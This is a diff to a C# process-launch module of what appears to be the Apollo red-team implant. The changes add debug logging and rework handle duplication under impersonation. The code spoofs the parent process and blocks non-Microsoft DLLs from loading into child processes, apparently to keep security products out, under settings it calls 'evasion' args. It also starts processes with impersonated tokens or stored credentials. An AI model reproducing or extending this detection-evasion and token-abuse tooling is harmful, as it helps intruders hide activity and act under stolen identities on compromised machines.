@@ -12,9 +12,11 @@ using System.ComponentModel;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using ApolloInterop.Utils;
 using static ApolloInterop.Enums.Win32;
 using static ApolloInterop.Structs.Win32;
 using AI = ApolloInterop.Classes.Core;
@@ -292,10 +294,13 @@ namespace Process
         bool InitializeStartupEnvironment(IntPtr hToken)
         {
             bool bRet = false;
+            DebugHelp.DebugWriteLine("Initializing process output pipes");
             bRet = InitializeProcessOutputPipes();
-
+            DebugHelp.DebugWriteLine("Initialized process output pipes: " + bRet);
+            DebugHelp.DebugWriteLine("Creating environment block");
             if (!_pCreateEnvironmentBlock(out _unmanagedEnv, hToken, false))
             {
+                DebugHelp.DebugWriteLine("Failed creating environment block");
                 _unmanagedEnv = IntPtr.Zero;
             }
 
@@ -308,6 +313,7 @@ namespace Process
             // Wonder if this interferes with stdout?
             _startupInfo.wShowWindow = 0;
             ApplicationStartupInfo evasionArgs = GetSafeStartupArgs();
+            DebugHelp.DebugWriteLine("Got safe startup args");
 
             if (_hParentProc != IntPtr.Zero)
             {
@@ -319,70 +325,64 @@ namespace Process
                 
                 var result1 = _pInitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
                 _startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-                if (bRet = _pInitializeProcThreadAttributeList(_startupInfoEx.lpAttributeList, dwAttributeCount, 0, ref lpSize))
+                DebugHelp.DebugWriteLine("Initializing proc thread attribute list");
+                bRet = _pInitializeProcThreadAttributeList(_startupInfoEx.lpAttributeList, dwAttributeCount, 0, ref lpSize);
+                if (bRet)
                 {
-
                     // BlockDLLs
                     if (evasionArgs.BlockDLLs)
                     {
+                        DebugHelp.DebugWriteLine("Enabling BlockDLLs");
                         bRet = EnableBlockDLLs();
                     }
-
-                    if (bRet = _pUpdateProcThreadAttribute(
-                    _startupInfoEx.lpAttributeList,
-                    0,
-                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                    lpVal,
-                    (IntPtr)IntPtr.Size,
-                    IntPtr.Zero,
-                    IntPtr.Zero))
+                    DebugHelp.DebugWriteLine("Setting parent process");
+                    bRet = _pUpdateProcThreadAttribute( _startupInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpVal, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+                    if (bRet)
                     {
                         try
                         {
-                            bRet = _pDuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
-                                hWriteOut,
-                                _hParentProc,
-                                ref hDupWriteOut,
-                                0,
-                                true,
-                                DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
-                            bRet = _pDuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
-                                hWriteErr,
-                                _hParentProc,
-                                ref hDupWriteErr,
-                                0,
-                                true,
-                                DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                            DebugHelp.DebugWriteLine($"Running pre handle duplication as: {WindowsIdentity.GetCurrent().Name}");
+                            IntPtr currentProcHandle;
+                            DebugHelp.DebugWriteLine($"Running get process handle as: {WindowsIdentity.GetCurrent().Name}");
+                            currentProcHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
+                            DebugHelp.DebugWriteLine($"Running duplicate handles as: {WindowsIdentity.GetCurrent().Name}");
+                            DebugHelp.DebugWriteLine("Duplicating handles");
+                            //source process handle, source handle, target process handle, target handle, desired access, inherit handle, options
+                            bRet = _pDuplicateHandle(currentProcHandle, hWriteOut, _hParentProc, ref hDupWriteOut, 0, true, DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                            DebugHelp.DebugWriteLine($"Duplicated StdOut handle normal: {bRet}");
+                            bRet = _pDuplicateHandle(currentProcHandle, hWriteErr, _hParentProc, ref hDupWriteErr, 0, true, DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                            DebugHelp.DebugWriteLine($"Duplicated StdErr handle normal: {bRet}");
                         }
                         catch (Exception ex)
                         {
+                            DebugHelp.DebugWriteLine(ex.Message);
                             try
                             {
+                                DebugHelp.DebugWriteLine("Failed to duplicate handles. Attempting to duplicate without impersonation.");
+                                var currentIdentity = new WindowsIdentity(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Token);
+                                var currentImpersonation = new WindowsIdentity(_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Token);
                                 using (_agent.GetIdentityManager().GetOriginal().Impersonate())
                                 {
-                                    bRet = _pDuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
-                                        hWriteOut,
-                                        _hParentProc,
-                                        ref hDupWriteOut,
-                                        0,
-                                        true,
-                                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
-                                    bRet = _pDuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
-                                        hWriteErr,
-                                        _hParentProc,
-                                        ref hDupWriteErr,
-                                        0,
-                                        true,
-                                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                                    var currentProcHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
+                                    DebugHelp.DebugWriteLine($"Reverted to: {WindowsIdentity.GetCurrent().Name}");
+                                    bRet = _pDuplicateHandle(currentProcHandle, hWriteOut, _hParentProc, ref hDupWriteOut, 0, true, DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                                    DebugHelp.DebugWriteLine($"Duplicated StdOut handle: {bRet}");
+                                    bRet = _pDuplicateHandle(currentProcHandle, hWriteErr, _hParentProc, ref hDupWriteErr, 0, true, DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                                    DebugHelp.DebugWriteLine($"Duplicated StdErr handle: {bRet}");
                                 }
+                                DebugHelp.DebugWriteLine("restoring previous impersonation");
+                                _agent.GetIdentityManager().SetImpersonationIdentity(currentImpersonation.Token);
+                                _agent.GetIdentityManager().SetPrimaryIdentity(currentIdentity.Token);
                             }
                             catch (Exception ex2)
                             {
+                                DebugHelp.DebugWriteLine($"Failed to duplicate handles: {ex2.Message}");
                                 bRet = false;
                             }
                         }
                         if (bRet)
                         {
+                            DebugHelp.DebugWriteLine("Setting up startup info");
                             _startupInfo.hStdOutput = hDupWriteOut;
                             _startupInfo.hStdError = hDupWriteErr;
                             _startupInfo.hStdInput = hReadIn;
@@ -392,11 +392,13 @@ namespace Process
                     }
                     else
                     {
+                        DebugHelp.DebugWriteLine("Failed to set parent process, exiting");
                         bRet = false;
                     }
                 }
                 else
                 {
+                    DebugHelp.DebugWriteLine("Failed to initialize proc thread attribute list, exiting");
                     bRet = false;
                 }
                 if (!bRet)
@@ -406,6 +408,7 @@ namespace Process
             }
             else
             {
+                DebugHelp.DebugWriteLine("Parent process handle was zero. Exiting.");
                 bRet = false;
             }
 
@@ -417,10 +420,7 @@ namespace Process
             bool bRet;
             var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
 
-            Marshal.WriteInt64(
-                lpMitigationPolicy,
-                PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
-                );
+            Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
 
             bRet = _pUpdateProcThreadAttribute(
                 _startupInfoEx.lpAttributeList,
@@ -457,6 +457,7 @@ namespace Process
 
         private bool InitializeProcessOutputPipes()
         {
+            DebugHelp.DebugWriteLine($"Running InitializeProcessOutputPipes as: {WindowsIdentity.GetCurrent().Name}");
             bool bRet;
             _securityAttributes.bInheritHandle = true;
             bRet = _pInitializeSecurityDescriptor(out SecurityDescriptor sd, 1);
@@ -529,6 +530,7 @@ namespace Process
             }
             else
             {
+                DebugHelp.DebugWriteLine($"Using Impersonating identity {_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Name}.");
                 return StartWithCredentials(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Token);
             }
             if (!bRet)
@@ -676,14 +678,28 @@ namespace Process
             int dwError;
             var bRet = false;
 
-            bRet = InitializeStartupEnvironment(hToken);
-
-            if (!bRet)
+            DebugHelp.DebugWriteLine($"calling InitializeStartupEnvironment");
+            if (_agent.GetIdentityManager().GetOriginal().Name != _agent.GetIdentityManager().GetCurrentPrimaryIdentity().Name)
             {
-                return bRet;
+                using (_agent.GetIdentityManager().GetOriginal().Impersonate())
+                {
+                    bRet = InitializeStartupEnvironment(hToken);
+                }
             }
             else
             {
+                bRet = InitializeStartupEnvironment(hToken);
+            }
+
+            if (!bRet)
+            {
+                DebugHelp.DebugWriteLine($"start up failed returning");
+                return bRet;
+
+            }
+            else
+            {
+                DebugHelp.DebugWriteLine("Calling create process as user.");
                 bRet = _pCreateProcessAsUser(
                     hToken,
                     null,
@@ -698,8 +714,11 @@ namespace Process
                     out _processInfo
                 );
                 dwError = Marshal.GetLastWin32Error();
+                DebugHelp.DebugWriteLine($"Create process as user returned: {bRet}");
+                DebugHelp.DebugWriteLine($"Error code: {dwError}");
                 if (!bRet && (dwError == 1314)) // ERROR_PRIVILEGE_NOT_HELD or FILE_NOT_FOUND
                 {
+                    DebugHelp.DebugWriteLine("Failed to create process as user. Attempting to create process with token.");
                     bRet = _pCreateProcessWithTokenW(
                         hToken,
                         LogonFlags.LOGON_NETCREDENTIALS_ONLY, // LOGON_NET_CREDENTIALS_ONLY
@@ -717,6 +736,7 @@ namespace Process
                     {
                         if (_agent.GetIdentityManager().GetCurrentLogonInformation(out ApolloLogonInformation cred))
                         {
+                            DebugHelp.DebugWriteLine("Failed to create process with token. Attempting to create process with logon.");
                             bRet = _pCreateProcessWithLogonW(
                                 cred.Username,
                                 cred.Domain,
@@ -735,7 +755,10 @@ namespace Process
                 }
 
                 if (!bRet)
+                {
+                    DebugHelp.DebugWriteLine($"Failed to create process Reason: {dwError}");
                     throw new Win32Exception(dwError);
+                }
 
                 PostStartupInitialize();
                 if (PID != 0)
